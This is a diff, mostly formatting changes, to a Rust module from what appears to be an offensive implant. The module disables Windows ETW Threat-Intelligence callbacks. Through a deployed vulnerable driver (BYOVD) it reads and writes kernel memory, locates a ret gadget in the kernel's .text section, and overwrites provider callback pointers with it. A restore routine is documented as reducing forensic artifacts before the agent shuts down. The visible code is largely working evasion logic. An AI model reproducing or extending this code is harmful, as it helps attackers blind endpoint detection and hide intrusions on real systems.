@@ -76,11 +76,11 @@
 
 #![cfg(all(windows, feature = "kernel-callback"))]
 
-use common::lock::MutexExt;
 use crate::kernel_callback::deploy::{self, DeployedDriver};
 use crate::kernel_callback::discover;
 use crate::kernel_callback::driver_db::VulnerableDriver;
 use anyhow::{bail, Context, Result};
+use common::lock::MutexExt;
 use once_cell::sync::Lazy;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
@@ -159,10 +159,9 @@ fn kernel_read_u64(
 ) -> Option<u64> {
     let mut buf = [0u8; 8];
     if driver.needs_physical_addr {
-        let phys = crate::kernel_callback::translate_va_to_pa(
-            driver, device_handle, cr3, kernel_addr,
-        )
-        .ok()?;
+        let phys =
+            crate::kernel_callback::translate_va_to_pa(driver, device_handle, cr3, kernel_addr)
+                .ok()?;
         unsafe { deploy::read_physical_memory(driver, device_handle, phys, &mut buf).ok()? }
     } else {
         unsafe { deploy::read_physical_memory(driver, device_handle, kernel_addr, &mut buf).ok()? }
@@ -183,7 +182,10 @@ fn kernel_write_u64(
     let data = value.to_le_bytes();
     if driver.needs_physical_addr {
         let phys = match crate::kernel_callback::translate_va_to_pa(
-            driver, device_handle, cr3, kernel_addr,
+            driver,
+            device_handle,
+            cr3,
+            kernel_addr,
         ) {
             Ok(p) => p,
             Err(_) => return false,
@@ -204,7 +206,10 @@ fn kernel_read_bytes(
 ) -> bool {
     if driver.needs_physical_addr {
         let phys = match crate::kernel_callback::translate_va_to_pa(
-            driver, device_handle, cr3, kernel_addr,
+            driver,
+            device_handle,
+            cr3,
+            kernel_addr,
         ) {
             Ok(p) => p,
             Err(_) => return false,
@@ -362,7 +367,12 @@ fn find_ret_address(
     cr3: u64,
 ) -> Result<u64> {
     // Method 1: Resolve IoInvalidDeviceRequest export.
-    match discover::resolve_kernel_symbol(driver, device_handle, kernel_base, "IoInvalidDeviceRequest") {
+    match discover::resolve_kernel_symbol(
+        driver,
+        device_handle,
+        kernel_base,
+        "IoInvalidDeviceRequest",
+    ) {
         Ok(addr) => {
             // Verify it's actually a ret instruction.
             #[cfg(target_arch = "x86_64")]
@@ -370,7 +380,10 @@ fn find_ret_address(
                 let mut buf = [0u8; 1];
                 if kernel_read_bytes(driver, device_handle, cr3, addr, &mut buf) {
                     if buf[0] == RET_BYTE {
-                        tracing::info!("etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
+                        tracing::info!(
+                            "etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}",
+                            addr
+                        );
                         return Ok(addr);
                     }
                     tracing::warn!(
@@ -384,7 +397,10 @@ fn find_ret_address(
                 let mut buf = [0u8; 4];
                 if kernel_read_bytes(driver, device_handle, cr3, addr, &mut buf) {
                     if u32::from_le_bytes(buf) == RET_U32 {
-                        tracing::info!("etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
+                        tracing::info!(
+                            "etw_ti_bypass: found ret at IoInvalidDeviceRequest: 0x{:016X}",
+                            addr
+                        );
                         return Ok(addr);
                     }
                     tracing::warn!(
@@ -396,7 +412,10 @@ fn find_ret_address(
             }
         }
         Err(e) => {
-            tracing::warn!("etw_ti_bypass: failed to resolve IoInvalidDeviceRequest: {}, scanning .text", e);
+            tracing::warn!(
+                "etw_ti_bypass: failed to resolve IoInvalidDeviceRequest: {}, scanning .text",
+                e
+            );
         }
     }
 
@@ -408,7 +427,13 @@ fn find_ret_address(
 
     let pe_offset = u32::from_le_bytes(dos_header[0x3C..0x40].try_into()?) as u64;
     let mut pe_sig = [0u8; 4];
-    if !kernel_read_bytes(driver, device_handle, cr3, kernel_base + pe_offset, &mut pe_sig) {
+    if !kernel_read_bytes(
+        driver,
+        device_handle,
+        cr3,
+        kernel_base + pe_offset,
+        &mut pe_sig,
+    ) {
         bail!("failed to read kernel PE signature");
     }
     if &pe_sig != b"PE\0\0" {
@@ -416,7 +441,13 @@ fn find_ret_address(
     }
 
     let mut coff_buf = [0u8; 20];
-    if !kernel_read_bytes(driver, device_handle, cr3, kernel_base + pe_offset + 4, &mut coff_buf) {
+    if !kernel_read_bytes(
+        driver,
+        device_handle,
+        cr3,
+        kernel_base + pe_offset + 4,
+        &mut coff_buf,
+    ) {
         bail!("failed to read COFF header");
     }
 
@@ -427,7 +458,13 @@ fn find_ret_address(
     for i in 0..num_sections {
         let section_offset = sections_offset + (i as u64) * 40;
         let mut section_header = [0u8; 40];
-        if !kernel_read_bytes(driver, device_handle, cr3, kernel_base + section_offset, &mut section_header) {
+        if !kernel_read_bytes(
+            driver,
+            device_handle,
+            cr3,
+            kernel_base + section_offset,
+            &mut section_header,
+        ) {
             continue;
         }
 
@@ -444,7 +481,13 @@ fn find_ret_address(
 
         let scan_size = std::cmp::min(4096u64, virtual_size);
         let mut scan_buf = vec![0u8; scan_size as usize];
-        if !kernel_read_bytes(driver, device_handle, cr3, kernel_base + virtual_address, &mut scan_buf) {
+        if !kernel_read_bytes(
+            driver,
+            device_handle,
+            cr3,
+            kernel_base + virtual_address,
+            &mut scan_buf,
+        ) {
             continue;
         }
 
@@ -455,7 +498,11 @@ fn find_ret_address(
             for offset in (0..scan_size).step_by(16) {
                 if scan_buf[offset as usize] == RET_BYTE {
                     let ret_addr = kernel_base + virtual_address + offset;
-                    tracing::info!("etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
+                    tracing::info!(
+                        "etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}",
+                        offset,
+                        ret_addr
+                    );
                     return Ok(ret_addr);
                 }
             }
@@ -463,7 +510,11 @@ fn find_ret_address(
             for (offset, &byte) in scan_buf.iter().enumerate() {
                 if byte == RET_BYTE {
                     let ret_addr = kernel_base + virtual_address + offset as u64;
-                    tracing::info!("etw_ti_bypass: found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
+                    tracing::info!(
+                        "etw_ti_bypass: found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}",
+                        offset,
+                        ret_addr
+                    );
                     return Ok(ret_addr);
                 }
             }
@@ -474,16 +525,32 @@ fn find_ret_address(
             // Prefer 16-byte aligned offsets.
             for offset in (0..scan_size.saturating_sub(4)).step_by(16) {
                 let off = offset as usize;
-                if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
+                if u32::from_le_bytes([
+                    scan_buf[off],
+                    scan_buf[off + 1],
+                    scan_buf[off + 2],
+                    scan_buf[off + 3],
+                ]) == ret_bytes
+                {
                     let ret_addr = kernel_base + virtual_address + offset;
-                    tracing::info!("etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
+                    tracing::info!(
+                        "etw_ti_bypass: found ret in .text at offset 0x{:04X}: 0x{:016X}",
+                        offset,
+                        ret_addr
+                    );
                     return Ok(ret_addr);
                 }
             }
             // Fallback: 4-byte aligned offsets.
             for offset in (0..scan_size.saturating_sub(4)).step_by(4) {
                 let off = offset as usize;
-                if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
+                if u32::from_le_bytes([
+                    scan_buf[off],
+                    scan_buf[off + 1],
+                    scan_buf[off + 2],
+                    scan_buf[off + 3],
+                ]) == ret_bytes
+                {
                     let ret_addr = kernel_base + virtual_address + offset;
                     tracing::info!("etw_ti_bypass: found ret in .text at 4-byte aligned offset 0x{:04X}: 0x{:016X}", offset, ret_addr);
                     return Ok(ret_addr);
@@ -679,7 +746,10 @@ fn walk_provider_callbacks(
 
         // Detect cycles (list should never cycle, but be defensive).
         if next_ptr == current_ptr {
-            tracing::warn!("etw_ti_bypass: detected self-referencing list entry at 0x{:016X}", current_ptr);
+            tracing::warn!(
+                "etw_ti_bypass: detected self-referencing list entry at 0x{:016X}",
+                current_ptr
+            );
             break;
         }
 
@@ -709,17 +779,16 @@ fn walk_provider_callbacks(
 /// - No ret gadget can be found.
 pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
     // Step 1: Get the deployed driver.
-    let deployed = deploy::get_deployed_driver().context(
-        "no BYOVD driver deployed — deploy a driver via kernel_callback::deploy first",
-    )?;
+    let deployed = deploy::get_deployed_driver()
+        .context("no BYOVD driver deployed — deploy a driver via kernel_callback::deploy first")?;
     let driver = deployed.driver;
     let device_handle = deployed
         .device_handle
         .context("no device handle for deployed driver")?;
 
     // Step 2: Resolve kernel base.
-    let kernel_base = discover::get_kernel_base()
-        .context("failed to resolve kernel base address")?;
+    let kernel_base =
+        discover::get_kernel_base().context("failed to resolve kernel base address")?;
 
     tracing::info!("etw_ti_bypass: kernel base: 0x{:016X}", kernel_base);
 
@@ -802,12 +871,20 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
         );
 
         // Walk the callback chain.
-        let callbacks =
-            walk_provider_callbacks(driver, device_handle, cr3, reg_entry_ptr, callback_offset, 16);
+        let callbacks = walk_provider_callbacks(
+            driver,
+            device_handle,
+            cr3,
+            reg_entry_ptr,
+            callback_offset,
+            16,
+        );
 
         if callbacks.is_empty() {
             result.skipped += 1;
-            result.details.push(format!("SKIP {} — no callbacks found in chain", provider));
+            result
+                .details
+                .push(format!("SKIP {} — no callbacks found in chain", provider));
             continue;
         }
 
@@ -826,10 +903,9 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
             // Skip NULL pointers (unregistered).
             if *original_value == 0 {
                 result.skipped += 1;
-                result.details.push(format!(
-                    "SKIP {}[{}] — callback is NULL",
-                    provider, j
-                ));
+                result
+                    .details
+                    .push(format!("SKIP {}[{}] — callback is NULL", provider, j));
                 continue;
             }
 
@@ -919,17 +995,16 @@ pub fn disable_etw_ti_callbacks() -> Result<EtwTiBypassResult> {
 /// Should be called before agent shutdown to minimize forensic artifacts.
 pub fn restore_etw_ti_callbacks() -> Result<EtwTiRestoreResult> {
     // Step 1: Get the deployed driver.
-    let deployed = deploy::get_deployed_driver().context(
-        "no BYOVD driver deployed — cannot restore ETW-Ti callbacks",
-    )?;
+    let deployed = deploy::get_deployed_driver()
+        .context("no BYOVD driver deployed — cannot restore ETW-Ti callbacks")?;
     let driver = deployed.driver;
     let device_handle = deployed
         .device_handle
         .context("no device handle for deployed driver")?;
 
     // Step 2: Resolve CR3 if needed.
-    let kernel_base = discover::get_kernel_base()
-        .context("failed to resolve kernel base for restore")?;
+    let kernel_base =
+        discover::get_kernel_base().context("failed to resolve kernel base for restore")?;
 
     let cr3 = if driver.needs_physical_addr {
         crate::kernel_callback::resolve_cr3(driver, device_handle, kernel_base)
@@ -1016,7 +1091,10 @@ fn kernel_write_bytes(
 ) -> bool {
     if driver.needs_physical_addr {
         let phys = match crate::kernel_callback::translate_va_to_pa(
-            driver, device_handle, cr3, kernel_addr,
+            driver,
+            device_handle,
+            cr3,
+            kernel_addr,
         ) {
             Ok(p) => p,
             Err(_) => return false,
@@ -1032,9 +1110,8 @@ fn kernel_write_bytes(
 /// Returns `true` if all non-NULL callbacks point to the ret gadget or if
 /// no callbacks are registered.
 pub fn verify_etw_ti_disabled() -> Result<bool> {
-    let deployed = deploy::get_deployed_driver().context(
-        "no BYOVD driver deployed — cannot verify ETW-Ti state",
-    )?;
+    let deployed = deploy::get_deployed_driver()
+        .context("no BYOVD driver deployed — cannot verify ETW-Ti state")?;
     let driver = deployed.driver;
     let device_handle = deployed
         .device_handle
@@ -1220,7 +1297,10 @@ mod tests {
 
     #[test]
     fn test_provider_display() {
-        assert_eq!(format!("{}", EtwTiProvider::ProcessCreate), "EtwTiProcessCreate");
+        assert_eq!(
+            format!("{}", EtwTiProvider::ProcessCreate),
+            "EtwTiProcessCreate"
+        );
         assert_eq!(format!("{}", EtwTiProvider::Network), "EtwTiNetwork");
     }
 }
